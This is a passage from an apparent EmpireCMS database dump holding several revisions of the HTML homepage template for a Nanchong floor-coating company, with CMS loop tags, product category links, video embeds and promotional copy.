                </p>\r\n                    </div>\r\n                </div>\r\n                <img src=\\\"/images/youshi_img3.jpg\\\" alt=\\\"\\\">\r\n            </div>\r\n            <div class=\\\"youshi_1 wow bounceInLeft\\\">\r\n                <img src=\\\"/images/youshi_img4.jpg\\\" alt=\\\"\\\">\r\n                <div class=\\\"youshi_1_txt\\\">\r\n                    <i><img src=\\\"/images/youshi_ico4.png\\\" alt=\\\"\\\"></i>\r\n                    <span>专业资质</span>\r\n\r\n                    <div class=\\\"picMarquee-left\\\">\r\n                        <div class=\\\"bd\\\">\r\n                            <ul class=\\\"picList\\\">\r\n\r\n                                [e:loop={20,10,0,1}]\r\n                                <li>\r\n                                    <div class=\\\"pic\\\"><img src=\\\"<?=$bqr[\\\'titlepic\\\']?>\\\" /></div>\r\n                                </li>\r\n                                [/e:loop]\r\n                            </ul>\r\n                        </div>\r\n                    </div>\r\n                </div>\r\n            </div>\r\n        </div>\r\n    </div>\r\n\r\n\r\n    <div class=\\\"huoban wow fadeInUp\\\">\r\n        <div class=\\\"huoban_title\\\">\r\n            <img src=\\\"/images/huoban_title.png\\\" alt=\\\"\\\">\r\n        </div>\r\n        <div class=\\\"huoban_content\\\">\r\n            <ul>\r\n\r\n                [e:loop={21,8,0,1}]\r\n                <li><img src=\\\"<?=$bqr[\\\'titlepic\\\']?>\\\" /></li>\r\n                [/e:loop]\r\n            </ul>\r\n        </div>\r\n    </div>\r\n    <div class=\\\"news wow fadeInUpBig\\\">\r\n        <div class=\\\"sy_title wow fadeInUp\\\">\r\n            <p>新闻资讯</p>\r\n            <i>NEWS</i>\r\n            <span>完善的质量保证体系和售后服务体系</span>\r\n        </div>\r\n        <div class=\\\"news_content\\\">\r\n            <ul class=\\\"news_l wow fadeInLeft\\\">\r\n                [e:loop={3,4,0,1}]\r\n                <li><img src=\\\'<?=$bqr[\\\'titlepic\\\']?>\\\'>\r\n                    <div class=\\\'news_txt\\\'><a href=\\\'<?=$bqsr[\\\'titleurl\\\']?>\\\'><?=$bqr[\\\'title\\\']?>?</a><span>03-09</span>\r\n                        <p><?=$bqr[smalltext]?>...</p>\r\n                    </div>\r\n                </li>\r\n\r\n                [/e:loop]\r\n\r\n\r\n            </ul>\r\n        </div>\r\n        <a href=\\\"/xwzx/qyzx/\\\">查看更多</a>\r\n    </div>\r\n\r\n    [!--temp.footer--]\r\n    <script src=\\\"/js/kefu.js\\\" type=\\\"text/javascript\\\"></script>\r\n    <div id=\\\"kefu\\\"></div>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/base.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/slick.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/wow.min.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/rem.min.js\\\"></script>\r\n</body>\r\n\r\n</html>',0,0,'',0,0,'',0,0,0,1588748321,'pubindextemp',1,'admin'),(169,1,'','<!DOCTYPE html\r\n    PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n\r\n<head>\r\n    <meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\" />\r\n    <meta name=\\\"viewport\\\"\r\n        content=\\\"width=device-width;minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no\\\" />\r\n    <meta name=\\\"applicable-device\\\" content=\\\"pc,mobile\\\" />\r\n    <title>[!--pagetitle--] - 南充市丽邦装饰工程有限公司</title>\r\n    <meta name=\\\"keywords\\\" content=\\\"[!--pagekey--]\\\" />\r\n    <meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/reset.css\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/css.css\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/animate.css\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/jquery-ui.css\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/flexslider.css\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/responsive.css\\\" />\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.min.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery-ui.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.flexslider-min.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.SuperSlide.2.1.1.js\\\"></script>\r\n    <script src=\\\"/js/Search.js\\\" type=\\\"text/javascript\\\"></script>\r\n</head>\r\n\r\n<body>\r\n    [!--temp.header--]\r\n    <div class=\\\"banner\\\">\r\n        <section class=\\\"slider\\\">\r\n            <div class=\\\"flexslider\\\">\r\n                <ul class=\\\"slides\\\">\r\n                    <li><img src=\\\'/images/banner01.jpg\\\' /></li>\r\n                    <li><img src=\\\'/images/banner02.jpg\\\' /></li>\r\n                    <li><img src=\\\'/images/banner03.jpg\\\' /></li>\r\n                </ul>\r\n            </div>\r\n        </section>\r\n    </div>\r\n    <div class=\\\"rmgjc_bg\\\">\r\n        <div class=\\\"rmgjc wow fadeInUp\\\">\r\n            <div class=\\\"gjc\\\"><span>热门关键词：</span>\r\n\r\n\r\n                [e:loop={1,3,0,0}]\r\n                <a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a>\r\n                [/e:loop]\r\n            </div>\r\n\r\n\r\n        </div>\r\n    </div>\r\n    <div class=\\\"anli\\\">\r\n        <div class=\\\"sy_title wow fadeInUp\\\">\r\n            <p>工程案例</p>\r\n            <i>CASE</i>\r\n            <span>完善的质量保证体系和售后服务体系</span>\r\n        </div>\r\n        <div class=\\\"anli_content wow fadeInUp\\\">\r\n            <div class=\\\"picScroll-left\\\">\r\n                <a class=\\\"next\\\"></a>\r\n                <div class=\\\"bd\\\">\r\n                    <ul class=\\\"picList\\\">\r\n\r\n\r\n                        [e:loop={18,10,0,1}]\r\n                        <li>\r\n                            <div class=\\\'pic\\\'><a href=\\\'<?=$bqsr[\\\'titleurl\\\']?>\\\'><img src=\\\'<?=$bqr[\\\'titlepic\\\']?>\\\' /></a>\r\n                            </div>\r\n                            <div class=\\\'title\\\'><a href=\\\'<?=$bqsr[\\\'titleurl\\\']?>\\\'><?=$bqr[\\\'title\\\']?></a></div>\r\n                        </li>\r\n                        [/e:loop]\r\n\r\n                    </ul>\r\n                </div>\r\n                <a class=\\\"prev\\\"></a>\r\n            </div>\r\n        </div>\r\n        <a href=\\\"/gcal/zxal/\\\">了解更多</a>\r\n    </div>\r\n    <div class=\\\"product_bg\\\">\r\n        <div class=\\\"product\\\">\r\n            <div class=\\\"sy_title wow fadeInUp\\\">\r\n                <p>产品中心</p>\r\n                <i>PRODUCTS</i>\r\n                <span>完善的质量保证体系和售后服务体系</span>\r\n            </div>\r\n            <div class=\\\"product_content\\\">\r\n\r\n\r\n                <div class=\\\'product_list wow fadeInLeft\\\'>\r\n                    <a href=\\\"/cpzx/gnxdp/\\\">特殊地坪系列</a>\r\n                    <dl>\r\n                        <dt><img src=\\\'/images/pro_fl_img1.jpg\\\'></dt>\r\n                        [e:loop={7,20,0,1}]\r\n                        <dd><a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a></dd>\r\n                        [/e:loop]\r\n                    </dl>\r\n                </div>\r\n\r\n                <div class=\\\'product_list wow fadeInLeft\\\'>\r\n                    <a href=\\\"/cpzx/hydp/\\\">环氧地坪系列</a>\r\n                    <dl>\r\n                        <dt><img src=\\\'/images/pro_fl_img2.jpg\\\'></dt>\r\n                        [e:loop={8,20,0,1}]\r\n                        <dd><a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a></dd>\r\n                        [/e:loop]\r\n                    </dl>\r\n                </div>\r\n\r\n\r\n                <div class=\\\'product_list wow fadeInLeft\\\'>\r\n                    <a href=\\\"/cpzx/gdsydp/\\\">高端商业地坪系列</a>\r\n                    <dl>\r\n                        <dt><img src=\\\'/images/pro_fl_img3.jpg\\\'></dt>\r\n                        [e:loop={9,20,0,1}]\r\n                        <dd><a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a></dd>\r\n                        [/e:loop]\r\n                    </dl>\r\n                </div>\r\n\r\n                <div class=\\\'product_list wow fadeInLeft\\\'>\r\n                    <a href=\\\"/cpzx/hwydcs/\\\">户外及运动场所系列</a>\r\n                    <dl>\r\n                        <dt><img src=\\\'/images/pro_fl_img4.jpg\\\'></dt>\r\n                        [e:loop={10,20,0,1}]\r\n                        <dd><a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a></dd>\r\n                        [/e:loop]\r\n                    </dl>\r\n                </div>\r\n\r\n                <div class=\\\'product_list wow fadeInLeft\\\'>\r\n                    <a href=\\\"/cpzx/dpcl/\\\">地坪材料</a>\r\n                    <dl>\r\n                        <dt><img src=\\\'/images/pro_fl_img5.jpg\\\'></dt>\r\n                        [e:loop={11,20,0,1}]\r\n                        <dd><a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a></dd>\r\n                        [/e:loop]\r\n                    </dl>\r\n                </div>\r\n\r\n            </div>\r\n        </div>\r\n    </div>\r\n\r\n    <div class=\\\"abouts\\\">\r\n        <div class=\\\"abouts1\\\">\r\n            <div class=\\\"sy_title wow fadeInUp\\\">\r\n                <p>关于丽邦</p>\r\n                <i>ABOUT US</i>\r\n                <span>完善的质量保证体系和售后服务体系</span>\r\n            </div>\r\n            <div class=\\\"shipin wow fadeInRight\\\">\r\n                <div id=\\\"a1\\\"></div>\r\n                <script type=\\\"text/javascript\\\" src=\\\"/js/ckplayer.js\\\" charset=\\\"utf-8\\\"></script>\r\n                <script type=\\\"text/javascript\\\">\r\n                    var flashvars = { f: \\\'/images/shipin.mp4\\\', c: 0, wh: \\\'16:9\\\' };\r\n                    var params = { allowFullScreen: true, allowScriptAccess: \\\'always\\\', wmode: \\\'transparent\\\' };\r\n                    var video = [\\\'/images/shipin.mp4->video/mp4\\\'];\r\n                    CKobject.embed(\\\'/images/ckplayer.swf\\\', \\\'a1\\\', \\\'ckplayer_a1\\\', \\\'351.2\\\', \\\'200\\\', true, flashvars, video, params);\r\n                </script>\r\n                <br/>\r\n                <div id=\\\"a2\\\"></div>\r\n                <script type=\\\"text/javascript\\\" src=\\\"/js/ckplayer.js\\\" charset=\\\"utf-8\\\"></script>\r\n                <script type=\\\"text/javascript\\\">\r\n                    var flashvars1 = { f: \\\'/images/shipin1.mp4\\\', c: 0, wh: \\\'16:9\\\' };\r\n                    var params1 = { allowFullScreen: true, allowScriptAccess: \\\'always\\\', wmode: \\\'transparent\\\' };\r\n                    var video1 = [\\\'/images/shipin1.mp4->video/mp4\\\'];\r\n                    CKobject.embed(\\\'/images/ckplayer.swf\\\', \\\'a2\\\', \\\'ckplayer_a2\\\', \\\'351.2\\\', \\\'200\\\', true, flashvars1, video1, params1);\r\n                </script>\r\n\r\n            </div>\r\n            <div class=\\\"abouts_txt wow fadeInLeft\\\">\r\n                <p> 南充市丽邦装饰工程有限公司，是一家集设计、营销、安装、客服、施工团队为一体，为客户提供一站式服务的专业品牌的康体企业，一直致力于打造“你的满意我们的无限动力”的品牌形象，专注的态度，专业的技术，严谨的全方位的跟踪服务，竭尽所能为用户提供更多、更好、更完善的地坪工程。\r\n                </p><br />\r\n                <p>我们一贯十分重视工程质量，注重施工队伍的建设，拥有各种场地经验的工程技术人员，而且还引进了专业的施工机械设备，使工程建设队伍无论在技术质量还是技术装备方面，都有着无法比拟的优势，经过各类工程的锤炼，目前公司施工队伍有着丰富的施工经验和较强的技术实力，完全有能力完成各类型场地的施工。\r\n                </p>\r\n                <a href=\\\"/gywm/gsjj/\\\">了解详情</a>\r\n            </div>\r\n        </div>\r\n    </div>\r\n\r\n    <div class=\\\"youshi wow fadeInUp\\\">\r\n        <div class=\\\"youshi_title\\\">\r\n            <p><img src=\\\"/images/youshi_title.jpg\\\" alt=\\\"\\\"></p>\r\n            <span><img src=\\\"/images/youshi_img.jpg\\\" alt=\\\"\\\"></span>\r\n        </div>\r\n        <div class=\\\"youshi_content\\\">\r\n            <div class=\\\"youshi_1 wow bounceInLeft\\\">\r\n                <img src=\\\"/images/youshi_img2.jpg\\\" alt=\\\"\\\">\r\n                <div class=\\\"youshi_1_txt\\\">\r\n                    <i><img src=\\\"/images/youshi_ico1.png\\\" alt=\\\"\\\"></i>\r\n                    <span>做有针对性地坪设计</span>\r\n                    <p>\r\n                        <font>★</font>考察原基层地面，做好数据分析；<br />\r\n                        <font>★</font>详听甲方需求，匹配优质材料；<br />\r\n                        <font>★</font>探讨设计结果，确定设计方案。\r\n                    </p>\r\n                </div>\r\n            </div>\r\n            <div class=\\\"youshi_1 youshi_2 wow bounceInRight\\\">\r\n                <div class=\\\"youshi_1_txt\\\">\r\n                    <i><img src=\\\"/images/youshi_ico2.png\\\" alt=\\\"\\\"></i>\r\n                    <span>二十年生产施工经验</span>\r\n                    <p>\r\n                        <font>★</font>生产施工负责人二十年相关经验，综合解决各种地坪需求；<br />\r\n                        <font>★</font>多年培养施工队伍二百余人；<br />\r\n                        <font>★</font>两千多项地坪案列，专为同行提供有偿技术支持。\r\n                    </p>\r\n                    <div class=\\\"youshi_1_txt\\\">\r\n                        <i><img src=\\\"/images/youshi_ico3.png\\\" alt=\\\"\\\"></i>\r\n                        <span>管家式服务，售后有保障</span>\r\n                        <p>\r\n                            <font>★</font>所有项目存档保存，终身售后支持；<br />\r\n                            <font>★</font>定期回访，指导使用、保养措施；<br />\r\n                            <font>★</font>不管项目大小，一视同仁。\r\n                        </p>\r\n                    </div>\r\n                </div>\r\n                <img src=\\\"/images/youshi_img3.jpg\\\" alt=\\\"\\\">\r\n            </div>\r\n            <div class=\\\"youshi_1 wow bounceInLeft\\\">\r\n                <img src=\\\"/images/youshi_img4.jpg\\\" alt=\\\"\\\">\r\n                <div class=\\\"youshi_1_txt\\\">\r\n                    <i><img src=\\\"/images/youshi_ico4.png\\\" alt=\\\"\\\"></i>\r\n                    <span>专业资质</span>\r\n\r\n                    <div class=\\\"picMarquee-left\\\">\r\n                        <div class=\\\"bd\\\">\r\n                            <ul class=\\\"picList\\\">\r\n\r\n                                [e:loop={20,10,0,1}]\r\n                                <li>\r\n                                    <div class=\\\"pic\\\"><img src=\\\"<?=$bqr[\\\'titlepic\\\']?>\\\" /></div>\r\n                                </li>\r\n                                [/e:loop]\r\n                            </ul>\r\n                        </div>\r\n                    </div>\r\n                </div>\r\n            </div>\r\n        </div>\r\n    </div>\r\n\r\n\r\n    <div class=\\\"huoban wow fadeInUp\\\">\r\n        <div class=\\\"huoban_title\\\">\r\n            <img src=\\\"/images/huoban_title.png\\\" alt=\\\"\\\">\r\n        </div>\r\n        <div class=\\\"huoban_content\\\">\r\n            <ul>\r\n\r\n                [e:loop={21,8,0,1}]\r\n                <li><img src=\\\"<?=$bqr[\\\'titlepic\\\']?>\\\" /></li>\r\n                [/e:loop]\r\n            </ul>\r\n        </div>\r\n    </div>\r\n    <div class=\\\"news wow fadeInUpBig\\\">\r\n        <div class=\\\"sy_title wow fadeInUp\\\">\r\n            <p>新闻资讯</p>\r\n            <i>NEWS</i>\r\n            <span>完善的质量保证体系和售后服务体系</span>\r\n        </div>\r\n        <div class=\\\"news_content\\\">\r\n            <ul class=\\\"news_l wow fadeInLeft\\\">\r\n                [e:loop={3,4,0,1}]\r\n                <li><img src=\\\'<?=$bqr[\\\'titlepic\\\']?>\\\'>\r\n                    <div class=\\\'news_txt\\\'><a href=\\\'<?=$bqsr[\\\'titleurl\\\']?>\\\'><?=$bqr[\\\'title\\\']?>?</a><span>03-09</span>\r\n                        <p><?=$bqr[smalltext]?>...</p>\r\n                    </div>\r\n                </li>\r\n\r\n                [/e:loop]\r\n\r\n\r\n            </ul>\r\n        </div>\r\n        <a href=\\\"/xwzx/qyzx/\\\">查看更多</a>\r\n    </div>\r\n\r\n    [!--temp.footer--]\r\n    <script src=\\\"/js/kefu.js\\\" type=\\\"text/javascript\\\"></script>\r\n    <div id=\\\"kefu\\\"></div>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/base.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/slick.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/wow.min.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/rem.min.js\\\"></script>\r\n</body>\r\n\r\n</html>',0,0,'',0,0,'',0,0,0,1588893660,'pubindextemp',1,'admin'),(193,1,'','<!DOCTYPE html\r\n    PUBLIC \\\"-//W3C//DTD XHTML 1.0 Transitional//EN\\\" \\\"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\\\">\r\n<html xmlns=\\\"http://www.w3.org/1999/xhtml\\\">\r\n\r\n<head>\r\n    <meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\" />\r\n    <meta name=\\\"viewport\\\"\r\n        content=\\\"width=device-width;minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no\\\" />\r\n    <meta name=\\\"applicable-device\\\" content=\\\"pc,mobile\\\" />\r\n    <title>网站首页 - 南充市丽邦装饰工程有限公司</title>\r\n    <meta name=\\\"keywords\\\" content=\\\"[!--pagekey--]\\\" />\r\n    <meta name=\\\"description\\\" content=\\\"[!--pagedes--]\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/reset.css\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/css.css\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/animate.css\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/jquery-ui.css\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/flexslider.css\\\" />\r\n    <link rel=\\\"stylesheet\\\" type=\\\"text/css\\\" href=\\\"/css/responsive.css\\\" />\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.min.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery-ui.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.flexslider-min.js\\\"></script>\r\n    <script type=\\\"text/javascript\\\" src=\\\"/js/jquery.SuperSlide.2.1.1.js\\\"></script>\r\n    <script src=\\\"/js/Search.js\\\" type=\\\"text/javascript\\\"></script>\r\n</head>\r\n\r\n<body>\r\n    [!--temp.header--]\r\n    <div class=\\\"banner\\\">\r\n        <section class=\\\"slider\\\">\r\n            <div class=\\\"flexslider\\\">\r\n                <ul class=\\\"slides\\\">\r\n                    <li><img src=\\\'/images/banner01.jpg\\\' /></li>\r\n                    <li><img src=\\\'/images/banner02.jpg\\\' /></li>\r\n                    <li><img src=\\\'/images/banner03.jpg\\\' /></li>\r\n                </ul>\r\n            </div>\r\n        </section>\r\n    </div>\r\n    <div class=\\\"rmgjc_bg\\\">\r\n        <div class=\\\"rmgjc wow fadeInUp\\\">\r\n            <div class=\\\"gjc\\\"><span>热门关键词：</span>\r\n\r\n\r\n                [e:loop={1,3,0,0}]\r\n                <a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a>\r\n                [/e:loop]\r\n            </div>\r\n\r\n\r\n        </div>\r\n    </div>\r\n    <div class=\\\"anli\\\">\r\n        <div class=\\\"sy_title wow fadeInUp\\\">\r\n            <p>工程案例</p>\r\n            <i>CASE</i>\r\n            <span>完善的质量保证体系和售后服务体系</span>\r\n        </div>\r\n        <div class=\\\"anli_content wow fadeInUp\\\">\r\n            <div class=\\\"picScroll-left\\\">\r\n                <a class=\\\"next\\\"></a>\r\n                <div class=\\\"bd\\\">\r\n                    <ul class=\\\"picList\\\">\r\n\r\n\r\n                        [e:loop={18,10,0,1}]\r\n                        <li>\r\n                            <div class=\\\'pic\\\'><a href=\\\'<?=$bqsr[\\\'titleurl\\\']?>\\\'><img src=\\\'<?=$bqr[\\\'titlepic\\\']?>\\\' /></a>\r\n                            </div>\r\n                            <div class=\\\'title\\\'><a href=\\\'<?=$bqsr[\\\'titleurl\\\']?>\\\'><?=$bqr[\\\'title\\\']?></a></div>\r\n                        </li>\r\n                        [/e:loop]\r\n\r\n                    </ul>\r\n                </div>\r\n                <a class=\\\"prev\\\"></a>\r\n            </div>\r\n        </div>\r\n        <a href=\\\"/gcal/zxal/\\\">了解更多</a>\r\n    </div>\r\n    <div class=\\\"product_bg\\\">\r\n        <div class=\\\"product\\\">\r\n            <div class=\\\"sy_title wow fadeInUp\\\">\r\n                <p>产品中心</p>\r\n                <i>PRODUCTS</i>\r\n                <span>完善的质量保证体系和售后服务体系</span>\r\n            </div>\r\n            <div class=\\\"product_content\\\">\r\n\r\n\r\n                <div class=\\\'product_list wow fadeInLeft\\\'>\r\n                    <a href=\\\"/cpzx/gnxdp/\\\">特殊地坪系列</a>\r\n                    <dl>\r\n                        <dt><img src=\\\'/images/pro_fl_img1.jpg\\\'></dt>\r\n                        [e:loop={7,20,0,1}]\r\n                        <dd><a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a></dd>\r\n                        [/e:loop]\r\n                    </dl>\r\n                </div>\r\n\r\n                <div class=\\\'product_list wow fadeInLeft\\\'>\r\n                    <a href=\\\"/cpzx/hydp/\\\">环氧地坪系列</a>\r\n                    <dl>\r\n                        <dt><img src=\\\'/images/pro_fl_img2.jpg\\\'></dt>\r\n                        [e:loop={8,20,0,1}]\r\n                        <dd><a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a></dd>\r\n                        [/e:loop]\r\n                    </dl>\r\n                </div>\r\n\r\n\r\n                <div class=\\\'product_list wow fadeInLeft\\\'>\r\n                    <a href=\\\"/cpzx/gdsydp/\\\">高端商业地坪系列</a>\r\n                    <dl>\r\n                        <dt><img src=\\\'/images/pro_fl_img3.jpg\\\'></dt>\r\n                        [e:loop={9,20,0,1}]\r\n                        <dd><a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a></dd>\r\n                        [/e:loop]\r\n                    </dl>\r\n                </div>\r\n\r\n                <div class=\\\'product_list wow fadeInLeft\\\'>\r\n                    <a href=\\\"/cpzx/hwydcs/\\\">户外及运动场所系列</a>\r\n                    <dl>\r\n                        <dt><img src=\\\'/images/pro_fl_img4.jpg\\\'></dt>\r\n                        [e:loop={10,20,0,1}]\r\n                        <dd><a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a></dd>\r\n                        [/e:loop]\r\n                    </dl>\r\n                </div>\r\n\r\n                <div class=\\\'product_list wow fadeInLeft\\\'>\r\n                    <a href=\\\"/cpzx/dpcl/\\\">地坪材料</a>\r\n                    <dl>\r\n                        <dt><img src=\\\'/images/pro_fl_img5.jpg\\\'></dt>\r\n                        [e:loop={11,20,0,1}]\r\n                        <dd><a href=\\\"<?=$bqsr[\\\'titleurl\\\']?>\\\"><?=$bqr[\\\'title\\\']?></a></dd>\r\n                        [/e:loop]\r\n                    </dl>\r\n                </div>\r\n\r\n            </div>\r\n        </div>\r\n    </div>\r\n\r\n    <div class=\\\"abouts\\\">\r\n        <div class=\\\"abouts1\\\">\r\n            <div class=\\\"sy_title wow fadeInUp\\\">\r\n                <p>关于丽邦</p>\r\n                <i>ABOUT US</i>\r\n                <span>完善的质量保证体系和售后服务体系</span>\r\n            </div>\r\n            <div class=\\\"shipin wow fadeInRight\\\">\r\n                <div id=\\\"a1\\\"></div>\r\n                <script type=\\\"text/javascript\\\" src=\\\"/js/ckplayer.js\\\" charset=\\\"utf-8\\\"></script>\r\n                <script type=\\\"text/javascript\\\">\r\n                    var flashvars = { f: \\\'/images/shipin.mp4\\\', c: 0, wh: \\\'16:9\\\' };\r\n                    var params = { allowFullScreen: true, allowScriptAccess: \\\'always\\\', wmode: \\\'transparent\\\' };\r\n                    var video = [\\\'/images/shipin.mp4->video/mp4\\\'];\r\n                    CKobject.embed(\\\'/images/ckplayer.swf\\\', \\\'a1\\\', \\\'ckplayer_a1\\\', \\\'351.2\\\', \\\'200\\\', true, flashvars, video, params);\r\n                </script>\r\n                <br/>\r\n                <div id=\\\"a2\\\"></div>\r\n                <script type=\\\"text/javascript\\\" src=\\\"/js/ckplayer.js\\\" charset=\\\"utf-8\\\"></script>\r\n                <script type=\\\"text/javascript\\\">\r\n                    var flashvars1 = { f: \\\'/images/shipin1.mp4\\\', c: 0, wh: \\\'16:9\\\' };\r\n                    var params1 = { allowFullScreen: true, allowScriptAccess: \\\'always\\\', wmode: \\\'transparent\\\' };\r\n                    var video1 = [\\\'/images/shipin1.mp4->video/mp4\\\'];\r\n                    CKobject.embed(\\\'/images/ckplayer.swf\\\', \\\'a2\\\', \\\'ckplayer_a2\\\', \\\'351.2\\\', \\\'200\\\', true, flashvars1, video1, params1);\r\n                </script>\r\n\r\n            </div>\r\n            <div class=\\\"abouts_txt wow fadeInLeft\\\">\r\n                <p> 南充市丽邦装饰工程有限公司，是一家集设计、营销、安装、客服、施工团队为一体，为客户提供一站式服务的专业品牌的康体企业，一直致力于打造“你的满意我们的无限动力”的品牌形象，专注的态度，专业的技术，严谨的全方位的跟踪服务，竭尽所能为用户提供更多、更好、更完善的地坪工程。\r\n                </p><br />\r\n                <p>我们一贯十分重视工程质量，注重施工队伍的建设，拥有各种场地经验的工程技术人员，而且还引进了专业的施工机械设备，使工程建设队伍无论在技术质量还是技术装备方面，都有着无法比拟的优势，经过各类工程的锤炼，目前公司施工队伍有着丰富的施工经验和较强的技术实力，完全有能力完成各类型场地的施工。\r\n                </p>\r\n                <a href=\\\"/gywm/gsjj/\\\">了解详情</a>\r\n            </div>\r\n        </div>\r\n    </div>\r\n\r\n    <div class=\\\"youshi wow fadeInUp\\\">\r\n        <div class=\\\"youshi_title\\\">\r\n            <p><img src=\\\"/images/youshi_title.jpg\\\" alt=\\\"\\\"></p>\r\n            <span><img src=\\\"/images/youshi_img.jpg\\\" alt=\\\"\\\"></span>\r\n        </div>\r\n        <div class=\\\"youshi_content\\\">\r\n            <div class=\\\"youshi_1 wow bounceInLeft\\\">\r\n                <img src=\\\"/images/youshi_img2.jpg\\\" alt=\\\"\\\">\r\n                <div class=\\\"youshi_1_txt\\\">\r\n                    <i><img src=\\\"/images/youshi_ico1.png\\\" alt=\\\"\\\"></i>\r\n                    <span>做有针对性地坪设计</span>\r\n                    <p>\r\n                        <font>★</font>考察原基层地面，做好数据分析；<br />\r\n                        <font>★</font>详听甲方需求，匹配优质材料；<br />\r\n                        <font>★</font>探讨设计结果，确定设计方案。\r\n                    </p>\r\n                </div>\r\n            </div>\r\n            <div class=\\\"youshi_1 youshi_2 wow bounceInRight\\\">\r\n                <div class=\\\"youshi_1_txt\\\">\r\n                    <i><img src=\\\"/images/youshi_ico2.png\\\" alt=\\\"\\\"></i>\r\n                    <span>二十年生产施工经验</span>\r\n                    <p>\r\n                        <font>★</font>生产施工负责人二十年相关经验，综合解决各种地坪需求；<br />\r\n                        <font>★</font>多年培养施工队伍二百余人；<br />\r\n                        <font>★</font>两千多项地坪案列，专为同行提供有偿技术支持。\r\n                    </p>\r\n                    <div class=\\\"youshi_1_txt\\\">\r\n                        <i><img src=\\\"/images/youshi_ico3.png\\\" alt=\\\"\\\"></i>\r\n                        <span>管家式服务，售后有保障</span>\r\n                        <p>\r\n                            <font>★</font>所有项目存档保存，终身售后支持；<br />\r\n                            <font>★</font>定期回访，指导使用、保养措施；<br />\r\n                            <font>★</font>不管项目大小，一视同仁。\r\n                        </p>\r\n                    </div>\r\n                </div>\r\n                <img src=\\\"/images/youshi_img3.jpg\\\" alt=\\\"\\\">\r\n            </div>\r\n            <div class=\\\"youshi_1 wow bounceInLeft\\\">\r\n                <img src=\\\"/images/youshi_img4.jpg\\\" alt=\\\"\\\">\r\n                <div class=\\\"youshi_1_txt\\\">\r\n                    <i><img src=\\\"/images/youshi_ico4.png\\\" alt=\\\"\\\"></i>\r\n                    <span>专业资质</span>\r\n\r\n                    <div class=\\\"picMarquee-left\\\">\r\n                        <div class=\\\"bd\\\">\r\n                            <ul class=\\\"picList\\\">\r\n\r\n                                [e:loop={20,10,0,1}]\r\n                                <li>\r\n                                    <div class=\\\"pic\\\"><img src=\\\"<?=$bqr[\\\'titlepic\\\']?>\\\" /></div>\r\n                                </li>\r\n                                [/e:loop]\r\n                            </ul>\r\n                        </div>\r\n                    </div>\r\n                </div>\r\n            </div>\r\n        </div>\r\n    </div>\r\n\r\n\r\n    <div class=\\\"huoban wow fadeInUp\\\">\r\n        <div class=\\\"huoban_title\\\">\r\n            <img src=\\\"/images/huoban_title.png\\\" alt=\\\"\\\">\r\n        </div>\r\n        <div class=\\\"huoban_content\\\">\r\n            <ul>\r\n\r\n                [e:loop={21,8,0,1}]\r\n                <li><img src=\\\"<?=$bqr[\\\'titlepic\\\']?>\\\" /></li>\r\n                